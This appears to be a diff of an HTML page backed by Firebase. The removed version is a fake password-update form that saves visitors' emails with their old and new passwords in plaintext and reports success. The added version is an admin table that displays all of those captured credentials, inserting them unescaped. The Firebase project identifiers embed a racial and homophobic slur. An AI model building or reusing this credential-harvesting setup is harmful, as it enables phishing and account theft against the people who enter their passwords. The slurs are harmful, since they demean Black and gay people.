@@ -3,168 +3,90 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Dashboard</title>
+  <title>Admin Dashboard</title>
   <style>
     body {
-      font-family: 'Arial', sans-serif;
+      font-family: 'Roboto', sans-serif;
+      background-color: #f8f9fa;
       margin: 0;
       padding: 0;
-      background-color: #f5f7fa;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
     }
-
+    .header {
+      background-color: #343a40;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
     .container {
+      margin: 30px auto;
       width: 90%;
-      max-width: 800px;
+      max-width: 1200px;
       background: white;
+      padding: 20px;
       border-radius: 10px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      overflow: hidden;
     }
-
-    .header {
-      background: #007BFF;
-      color: white;
-      padding: 20px;
+    h1, h2 {
       text-align: center;
     }
-
-    .header h1 {
-      margin: 0;
-      font-size: 24px;
-    }
-
-    .form-section {
-      padding: 20px;
-      border-bottom: 1px solid #f0f0f0;
-    }
-
-    .form-section label {
-      font-weight: bold;
-      display: block;
-      margin-bottom: 5px;
-    }
-
-    .form-section input {
+    table {
       width: 100%;
-      padding: 10px;
-      margin-bottom: 15px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-    }
-
-    .password-container {
-      position: relative;
-    }
-
-    .toggle-password {
-      position: absolute;
-      top: 50%;
-      right: 10px;
-      transform: translateY(-50%);
-      cursor: pointer;
-      font-size: 14px;
-      color: #666;
-    }
-
-    .form-section button {
-      width: 100%;
-      padding: 12px;
-      background-color: #007BFF;
-      border: none;
-      color: white;
+      border-collapse: collapse;
+      margin-top: 20px;
       font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.3s;
     }
-
-    .form-section button:hover {
-      background-color: #0056b3;
-    }
-
-    .message {
-      margin-top: 10px;
-      text-align: center;
-      font-weight: bold;
-    }
-
-    .user-list {
-      padding: 20px;
-    }
-
-    .user-list h3 {
-      margin: 0 0 20px;
-      color: #333;
-    }
-
-    .user-card {
-      background: #f9f9f9;
-      padding: 15px;
-      margin-bottom: 15px;
-      border-radius: 5px;
+    th, td {
+      padding: 12px 15px;
       border: 1px solid #ddd;
-      display: flex;
-      flex-direction: column;
-      gap: 5px;
+      text-align: left;
     }
-
-    .user-card p {
-      margin: 0;
+    th {
+      background-color: #007bff;
+      color: white;
+      text-transform: uppercase;
+    }
+    tr:nth-child(even) {
+      background-color: #f2f2f2;
+    }
+    tr:hover {
+      background-color: #e9ecef;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
       font-size: 14px;
-      color: #555;
-    }
-
-    .user-card span {
-      font-weight: bold;
-      color: #333;
+      color: #6c757d;
     }
   </style>
 </head>
 <body>
+  <div class="header">
+    <h1>Admin Dashboard</h1>
+  </div>
+
   <div class="container">
-    <div class="header">
-      <h1>User Dashboard</h1>
-    </div>
-    <div class="form-section">
-      <form id="passwordForm">
-        <label for="email">Email:</label>
-        <input type="email" id="email" placeholder="Enter your email" required>
+    <h2>User Details</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>Old Password</th>
+          <th>New Password</th>
+        </tr>
+      </thead>
+      <tbody id="userTable">
+        <!-- Dynamic data will be inserted here -->
+      </tbody>
+    </table>
+  </div>
 
-        <label for="oldPassword">Old Password:</label>
-        <div class="password-container">
-          <input type="password" id="oldPassword" placeholder="Enter your old password" required>
-          <span class="toggle-password" data-target="oldPassword">👁️</span>
-        </div>
-
-        <label for="newPassword">New Password:</label>
-        <div class="password-container">
-          <input type="password" id="newPassword" placeholder="Enter your new password" required>
-          <span class="toggle-password" data-target="newPassword">👁️</span>
-        </div>
-
-        <label for="confirmPassword">Confirm Password:</label>
-        <div class="password-container">
-          <input type="password" id="confirmPassword" placeholder="Confirm your new password" required>
-          <span class="toggle-password" data-target="confirmPassword">👁️</span>
-        </div>
-
-        <button type="submit">Update Password</button>
-      </form>
-      <div id="message" class="message"></div>
-    </div>
-    <div class="user-list">
-      <h3>Recently Added Users</h3>
-      <div id="userDetails"></div>
-    </div>
+  <div class="footer">
+    © 2025 Admin Dashboard. All rights reserved.
   </div>
 
   <script type="module">
     import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js';
-    import { getFirestore, collection, addDoc, query, orderBy, limit, getDocs } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';
+    import { getFirestore, collection, query, orderBy, getDocs } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';
 
     // Firebase configuration
     const firebaseConfig = {
@@ -172,7 +94,7 @@
       authDomain: "gay-ass-nigga.firebaseapp.com",
       databaseURL: "https://gay-ass-nigga-default-rtdb.firebaseio.com",
       projectId: "gay-ass-nigga",
-      storageBucket: "gay-ass-nigga.firebasestorage.app",
+      storageBucket: "gay-ass-nigga.appspot.com",
       messagingSenderId: "740449529935",
       appId: "1:740449529935:web:ab2538ff3bdad3fbc8fa3a"
     };
@@ -181,77 +103,32 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // Form handling
-    const form = document.getElementById('passwordForm');
-    const messageDiv = document.getElementById('message');
-    const userDetailsDiv = document.getElementById('userDetails');
+    // Fetch and display user data sorted by timestamp (most recent first)
+    const userTable = document.getElementById('userTable');
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-
-      const email = document.getElementById('email').value;
-      const oldPassword = document.getElementById('oldPassword').value;
-      const newPassword = document.getElementById('newPassword').value;
-      const confirmPassword = document.getElementById('confirmPassword').value;
-
-      if (newPassword !== confirmPassword) {
-        messageDiv.textContent = "New password and confirm password do not match!";
-        return;
-      }
-
+    async function loadUserData() {
       try {
-        await addDoc(collection(db, 'passwords'), {
-          email,
-          oldPassword,
-          newPassword,
-          timestamp: new Date()
+        const q = query(collection(db, 'passwords'), orderBy('timestamp', 'desc'));
+        const querySnapshot = await getDocs(q);
+
+        querySnapshot.forEach((doc) => {
+          const data = doc.data();
+          const row = `
+            <tr>
+              <td>${data.email}</td>
+              <td>${data.oldPassword}</td>
+              <td>${data.newPassword}</td>
+            </tr>
+          `;
+          userTable.insertAdjacentHTML('beforeend', row);
         });
-        messageDiv.style.color = 'green';
-        messageDiv.textContent = "Password updated successfully!";
-        form.reset();
-
-        // Fetch and display most recent user details
-        displaySortedUsers();
       } catch (error) {
-        messageDiv.textContent = "Error saving data: " + error.message;
+        console.error("Error loading user data:", error);
       }
-    });
-
-    // Display most recent users
-    async function displaySortedUsers() {
-      const q = query(collection(db, 'passwords'), orderBy('timestamp', 'desc'));
-      const querySnapshot = await getDocs(q);
-
-      userDetailsDiv.innerHTML = '';
-      querySnapshot.forEach((doc) => {
-        const { email, oldPassword, newPassword } = doc.data();
-        const userCard = `
-          <div class="user-card">
-            <p><span>User ID:</span> ${email}</p>
-            <p><span>Old Password:</span> ${oldPassword}</p>
-            <p><span>New Password:</span> ${newPassword}</p>
-          </div>
-        `;
-        userDetailsDiv.innerHTML += userCard;
-      });
     }
 
-    // Call display function on load
-    displaySortedUsers();
-
-    // Toggle password visibility
-    document.querySelectorAll('.toggle-password').forEach((icon) => {
-      icon.addEventListener('click', () => {
-        const input = document.getElementById(icon.dataset.target);
-        if (input.type === 'password') {
-          input.type = 'text';
-          icon.textContent = '🙈';
-        } else {
-          input.type = 'password';
-          icon.textContent = '👁️';
-        }
-      });
-    });
+    // Load user data on page load
+    loadUserData();
   </script>
 </body>
-</html>
+</html>jj
